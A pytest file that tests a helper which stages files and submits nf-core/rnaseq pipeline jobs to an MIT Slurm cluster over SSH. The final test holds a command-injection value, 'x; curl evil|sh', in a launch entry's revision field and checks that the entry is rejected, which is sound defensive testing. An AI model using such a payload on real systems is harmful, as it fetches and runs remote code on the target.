import yaml
from pathlib import Path
import chat_nextseek.luria.submitter as sub

LE = {"user": "cdemu", "host": "luria.mit.edu", "key": "/k", "working_path": "/net/x"}


def _fixture(tmp_path):
    ss = tmp_path / "samplesheet.csv"
    ss.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "params.yml").write_text(yaml.safe_dump({"input": str(ss), "genome": "GRCm39"}))
    (tmp_path / "launch.yml").write_text(yaml.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq",
        "revision": "3.21.0", "params-file": "./params.yml",
    }]}))
    return tmp_path / "launch.yml", ss


def _patch_transport(monkeypatch):
    calls = {"ssh": [], "scp": []}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run",
                        lambda le, cmd, *, key_path: (calls["ssh"].append(cmd),
                                                      "Submitted batch job 4821\n")[1])
    monkeypatch.setattr(sub, "scp_file",
                        lambda le, local, remote, *, key_path: calls["scp"].append((str(local), remote)))
    return calls


def test_submit_luria_happy_path(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    calls = _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env=LE, resources={"partition": "bcc"})
    assert len(runs) == 1
    ref = runs[0]
    assert ref["job_id"] == "4821"
    assert ref["remote_dir"].startswith("/net/x/runs/nfcore_rnaseq_")
    assert ref["log"].endswith("/nf-4821.out")
    # mkdir happened, sbatch happened
    assert any(c.startswith("mkdir -p") for c in calls["ssh"])
    assert any("sbatch run.sh" in c for c in calls["ssh"])
    # three files staged, to explicit remote names
    remotes = {remote.rsplit("/", 1)[1] for _, remote in calls["scp"]}
    assert remotes == {"run.sh", "params.yml", "samplesheet.csv"}


def test_submit_luria_rewrites_params_input_to_remote(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    captured = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 1\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/params.yml"):
            captured["params"] = yaml.safe_load(Path(local).read_text())

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    sub.submit_luria(str(launch), luria_env=LE)
    assert captured["params"]["input"].startswith("/net/x/runs/nfcore_rnaseq_")
    assert captured["params"]["input"].endswith("/samplesheet.csv")


def test_submit_luria_skips_when_env_incomplete(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(launch), luria_env={"user": "u", "key": None, "working_path": "/p", "host": "luria.mit.edu"})
    assert runs == []


def test_submit_luria_missing_launch_returns_empty():
    assert sub.submit_luria("/no/such/launch.yml", luria_env=LE) == []


def _raise(*a, **k):
    raise RuntimeError("boom")


def test_submit_luria_cleans_temp_files_on_render_error(tmp_path, monkeypatch):
    launch, ss = _fixture(tmp_path)
    _patch_transport(monkeypatch)
    created = []
    real_mkstemp = sub.tempfile.mkstemp

    def tracking_mkstemp(*a, **k):
        fd, path = real_mkstemp(*a, **k)
        created.append(path)
        return fd, path

    monkeypatch.setattr(sub.tempfile, "mkstemp", tracking_mkstemp)
    monkeypatch.setattr(sub, "render_run_script", _raise)
    runs = sub.submit_luria(str(launch), luria_env=LE)
    assert runs == []  # entry skipped after render error
    import os as _os
    assert created and all(not _os.path.exists(p) for p in created)  # no temp file left behind


def test_submit_luria_one_bad_entry_does_not_abort_siblings(tmp_path, monkeypatch):
    import yaml as _y
    ss = tmp_path / "samplesheet.csv"
    ss.write_text("sample,fastq_1\nA,a.fq.gz\n")
    (tmp_path / "params.yml").write_text(_y.safe_dump({"input": str(ss)}))
    (tmp_path / "launch.yml").write_text(_y.safe_dump({"launch": [
        {"name": "bad", "params-file": "./params.yml"},  # missing pipeline/revision -> skipped
        {"name": "good", "pipeline": "nf-core/rnaseq", "revision": "3.21.0", "params-file": "./params.yml"},
    ]}))
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE)
    assert len(runs) == 1
    assert runs[0]["run_name"] == "good"


def test_submit_luria_uses_state_samplesheet_and_remaps_tower_params(tmp_path, monkeypatch):
    import yaml as _y
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample,fastq_1\nA,a.fq.gz\n")
    # Tower-shaped params: input/outdir point at a bucket path that does NOT exist locally.
    (tmp_path / "params.yml").write_text(_y.safe_dump({
        "input": "/orcd/bucket/inputs/nope.csv", "outdir": "/orcd/bucket/results/x"}))
    (tmp_path / "launch.yml").write_text(_y.safe_dump({"launch": [{
        "name": "nfcore_rnaseq", "pipeline": "nf-core/rnaseq", "revision": "3.21.0",
        "params-file": "./params.yml"}]}))
    staged = {}
    monkeypatch.setattr(sub, "prepare_key", lambda k: "/tmp/fake_key")
    monkeypatch.setattr(sub, "ssh_run", lambda le, cmd, *, key_path: "Submitted batch job 7\n")

    def fake_scp(le, local, remote, *, key_path):
        if remote.endswith("/samplesheet.csv"):
            staged["sheet_src"] = str(local)
        if remote.endswith("/params.yml"):
            staged["params"] = _y.safe_load(Path(local).read_text())

    monkeypatch.setattr(sub, "scp_file", fake_scp)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
    assert len(runs) == 1
    assert staged["sheet_src"] == str(real_sheet)  # staged the REAL local CSV, not the bucket path
    assert staged["params"]["input"].startswith("/net/x/runs/") and staged["params"]["input"].endswith("/samplesheet.csv")
    assert staged["params"]["outdir"].startswith("/net/x/results/")  # remapped off /orcd


def test_submit_luria_skips_entry_with_injected_revision(tmp_path, monkeypatch):
    import yaml as _y
    real_sheet = tmp_path / "samplesheet.csv"
    real_sheet.write_text("sample\nA\n")
    (tmp_path / "params.yml").write_text(_y.safe_dump({"input": str(real_sheet)}))
    (tmp_path / "launch.yml").write_text(_y.safe_dump({"launch": [{
        "name": "evil", "pipeline": "nf-core/rnaseq", "revision": "x; curl evil|sh",
        "params-file": "./params.yml"}]}))
    _patch_transport(monkeypatch)
    runs = sub.submit_luria(str(tmp_path / "launch.yml"), luria_env=LE, samplesheet_local=str(real_sheet))
    assert runs == []  # injected revision -> render raises -> entry skipped, never launched
